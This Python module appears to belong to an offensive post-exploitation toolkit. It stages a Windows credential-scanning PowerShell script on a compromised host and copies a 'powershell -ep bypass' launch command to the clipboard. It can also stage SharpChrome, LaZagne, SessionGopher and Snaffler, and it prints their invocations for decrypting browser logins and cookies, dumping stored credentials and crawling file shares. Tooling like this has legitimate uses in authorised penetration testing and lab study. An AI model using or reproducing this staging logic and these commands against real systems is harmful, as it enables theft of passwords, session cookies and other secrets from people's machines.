import pyperclip

from core.paths import get_tools_dir, get_windows_tools_dir
from modules.upload.windows import stage_windows_files


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

#
# Follow-up tools windows_credscan.ps1's own report points operators at
# for the pieces it deliberately doesn't reimplement (DPAPI decryption,
# broad credential-store sweeps, network-share crawling).
#
FOLLOWUP_TOOLS = ("SharpChrome.exe", "lazagne.exe", "SessionGopher.ps1", "Snaffler.exe")

#
# Reference invocation for each tool above - printed (not clipboard-copied)
# only for the ones actually transferred.
#
FOLLOWUP_RUNNERS = {
    "SharpChrome.exe": ".\\SharpChrome.exe logins /unprotect\n.\\SharpChrome.exe cookies /format:json",
    "lazagne.exe": r".\lazagne.exe all",
    "SessionGopher.ps1": "Import-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Target $env:COMPUTERNAME",
    "Snaffler.exe": r".\Snaffler.exe -o snaffler.log",
}


def run(data, cred, args):

    #
    # Standalone transfer of windows_credscan.ps1 - fire-and-forget, no
    # ### BEGIN/END markers and nothing pulls its output back for
    # attacker-side parsing (same shape as tools/linux_credscan.py). Read
    # the report live on target. Mainly here so the script can be staged
    # and re-run on its own without going through the full enum flow.
    #
    cred_script = get_tools_dir() / "windows_credscan.ps1"

    light_mode = input(
        f"\n{Y}[?]{W} Light mode (skip recursive filesystem walk, fast/bounded checks only)? [y/N]: "
    ).strip().lower() in ("y", "yes")

    include_followup = input(
        f"\n{Y}[?]{W} Also transfer follow-up tools (SharpChrome/LaZagne/SessionGopher/Snaffler)? [Y/n]: "
    ).strip().lower() in ("", "y", "yes")

    scripts = [cred_script]
    transferred_followups = []

    if include_followup:

        followup_dir = get_windows_tools_dir()
        transferred_followups = [name for name in FOLLOWUP_TOOLS if (followup_dir / name).is_file()]

        missing = [name for name in FOLLOWUP_TOOLS if name not in transferred_followups]
        if missing:
            print(f"{Y}[!] Missing from {followup_dir}: {', '.join(missing)} - not transferred.{W}")

        scripts.extend(followup_dir / name for name in transferred_followups)

    stage_windows_files(scripts)

    helper = r"powershell -ep bypass -File .\windows_credscan.ps1"

    if light_mode:
        helper += " -Light"

    pyperclip.copy(helper)

    print()
    print(f"{Y}{helper}")
    print()
    print(f"{G}→ helper command copied to clipboard{W}")

    #
    # Reference only - not part of the clipboard helper, since these are
    # manual follow-ups triggered by what windows_credscan.ps1 finds, not
    # something to run unconditionally alongside it.
    #
    if transferred_followups:

        print()
        print(f"{B}[*] Follow-up tool commands (run manually as needed):{W}")

        for name in transferred_followups:
            print(f"\n{Y}{FOLLOWUP_RUNNERS[name]}{W}")
